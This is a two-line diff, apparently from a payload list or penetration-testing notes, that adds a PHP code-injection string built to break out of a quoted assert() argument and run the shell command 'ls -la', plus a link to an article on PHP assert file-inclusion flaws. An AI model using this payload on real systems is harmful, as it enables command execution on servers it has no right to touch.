@@ -1,0 +1,2 @@
+'.system("ls%20-la").'
+https://www.linkedin.com/pulse/php-assert-vulnerable-local-file-inclusion-mohamed-fakroud/
